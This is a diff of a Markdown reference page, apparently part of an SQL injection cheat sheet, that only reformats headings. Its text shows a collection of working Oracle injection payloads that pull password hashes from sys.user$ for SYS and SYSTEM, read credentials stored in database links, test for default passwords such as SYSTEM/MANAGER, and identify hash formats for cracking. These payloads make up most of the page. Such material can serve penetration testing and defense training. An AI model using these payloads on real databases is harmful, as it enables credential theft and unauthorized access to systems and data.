@@ -7,11 +7,9 @@ tags: ["password", "hash", "cracking", "authentication"]
 lastUpdated: 2025-03-15
 ---
 
-## Password Cracking
-
 Oracle database implements various password hashing algorithms depending on the version. Extracting and cracking these password hashes can allow attackers to gain authenticated access to the database with legitimate credentials.
 
-### Oracle Password Storage Evolution
+## Oracle Password Storage Evolution
 
 Oracle's password hashing has evolved over versions:
 
@@ -21,7 +19,7 @@ Oracle's password hashing has evolved over versions:
 | Oracle 11g     | SHA-1           | Includes password salt, case-sensitive               | USER$ table      |
 | Oracle 12c+    | SHA-2 (SHA-512) | Strong salted hash with PBKDF2                       | USER$ table      |
 
-### Password Hash Locations
+## Password Hash Locations
 
 The main locations for password hashes in Oracle:
 
@@ -31,9 +29,9 @@ SELECT name, password FROM sys.user$  -- Pre-11g
 SELECT name, password, spare4 FROM sys.user$  -- 11g+
 ```
 
-### SQL Injection Examples
+## SQL Injection Examples
 
-#### Extracting Password Hashes
+### Extracting Password Hashes
 
 ```sql
 -- Basic hash extraction (pre-11g)
@@ -46,7 +44,7 @@ SELECT name, password, spare4 FROM sys.user$  -- 11g+
 ' UNION SELECT name, password FROM sys.user$ WHERE name='SYSTEM'--
 ```
 
-#### Accessing Hash Information via Data Dictionary Views
+### Accessing Hash Information via Data Dictionary Views
 
 ```sql
 -- Through DBA_USERS (requires DBA privileges)
@@ -56,9 +54,9 @@ SELECT name, password, spare4 FROM sys.user$  -- 11g+
 ' UNION SELECT username, NULL FROM all_users--
 ```
 
-### Understanding Oracle Hash Formats
+## Understanding Oracle Hash Formats
 
-#### Pre-11g Format (DES-based)
+### Pre-11g Format (DES-based)
 
 The format is typically a 16-character string:
 
@@ -68,7 +66,7 @@ The format is typically a 16-character string:
 ' UNION SELECT password FROM sys.user$ WHERE name='SCOTT'--
 ```
 
-#### 11g Format (SHA-1 based)
+### 11g Format (SHA-1 based)
 
 The format is typically a longer string prefixed with 'S:':
 
@@ -78,7 +76,7 @@ The format is typically a longer string prefixed with 'S:':
 ' UNION SELECT spare4 FROM sys.user$ WHERE name='SCOTT'--
 ```
 
-#### 12c Format (SHA-512 based)
+### 12c Format (SHA-512 based)
 
 Even more complex hash format:
 
@@ -88,16 +86,16 @@ Even more complex hash format:
 ' UNION SELECT spare4 FROM sys.user$ WHERE name='SCOTT'--
 ```
 
-### Password Cracking Techniques
+## Password Cracking Techniques
 
-#### Dictionary Attacks
+### Dictionary Attacks
 
 ```sql
 -- Checking if password hash matches known values
 ' UNION SELECT username, CASE WHEN password='F894844C34402B67' THEN 'Password is tiger' ELSE 'Unknown' END FROM sys.user$ WHERE name='SCOTT'--
 ```
 
-#### Rainbow Table Attacks
+### Rainbow Table Attacks
 
 Pre-computed hash tables can be used for cracking older Oracle hashes:
 
@@ -106,25 +104,25 @@ Pre-computed hash tables can be used for cracking older Oracle hashes:
 ' UNION SELECT 'Hash for '||name||': '||password FROM sys.user$ WHERE name='SYSTEM'--
 ```
 
-### Hash Manipulation Techniques
+## Hash Manipulation Techniques
 
-#### Hash Validation
+### Hash Validation
 
 ```sql
 -- Testing if a specific hash format is being used
 ' UNION SELECT CASE WHEN SUBSTR(password,1,2)='S:' THEN '11g Hash' WHEN LENGTH(password)=16 THEN 'Pre-11g Hash' ELSE 'Unknown' END, NULL FROM sys.user$ WHERE rownum=1--
 ```
 
-#### Password Salting Detection
+### Password Salting Detection
 
 ```sql
 -- Check if 11g or 12c salted hashes are used
 ' UNION SELECT CASE WHEN spare4 IS NOT NULL THEN 'Using Salted Hashes' ELSE 'Using Old Hash Format' END, NULL FROM sys.user$ WHERE rownum=1--
 ```
 
-### Advanced Extraction Techniques
+## Advanced Extraction Techniques
 
-#### Using DBMS_METADATA
+### Using DBMS_METADATA
 
 If you have appropriate privileges:
 
@@ -133,7 +131,7 @@ If you have appropriate privileges:
 ' UNION SELECT DBMS_METADATA.GET_DDL('USER', username), NULL FROM all_users WHERE username='SYSTEM'--
 ```
 
-#### Using Database Links
+### Using Database Links
 
 Database links often store credentials in plaintext:
 
@@ -142,7 +140,7 @@ Database links often store credentials in plaintext:
 ' UNION SELECT db_link, username || DECODE(password, NULL, '', ':' || password) FROM all_db_links--
 ```
 
-### Password Policy Information
+## Password Policy Information
 
 ```sql
 -- Extract password policy settings
@@ -152,7 +150,7 @@ Database links often store credentials in plaintext:
 ' UNION SELECT username, account_status, lock_date, expiry_date FROM dba_users--
 ```
 
-### Default and Known Password Checks
+## Default and Known Password Checks
 
 ```sql
 -- Check for default accounts with default passwords
@@ -162,7 +160,7 @@ Database links often store credentials in plaintext:
 ' OR username='SYSTEM' AND password='MANAGER'--
 ```
 
-### Targeting Pre-11g Systems
+## Targeting Pre-11g Systems
 
 ```sql
 -- Extract all hashes
@@ -172,23 +170,23 @@ Database links often store credentials in plaintext:
 ' UNION SELECT password, NULL FROM sys.user$ WHERE name IN ('SYS','SYSTEM','ADMIN')--
 ```
 
-### Targeting 11g+ Systems
+## Targeting 11g+ Systems
 
 ```sql
 -- Extract dual-format hashes
 ' UNION SELECT name || ':' || password || ':' || spare4, NULL FROM sys.user$--
 ```
 
-### Password Authentication Bypass Techniques
+## Password Authentication Bypass Techniques
 
-#### Using AUTHID CURRENT_USER
+### Using AUTHID CURRENT_USER
 
 ```sql
 -- Testing for procedures with invoker rights that might bypass authentication
 ' UNION SELECT OWNER || '.' || OBJECT_NAME, OBJECT_TYPE FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('PROCEDURE', 'FUNCTION') AND OWNER != 'SYS'--
 ```
 
-#### Using IDENTIFIED BY VALUES
+### Using IDENTIFIED BY VALUES
 
 If you can modify user accounts:
 
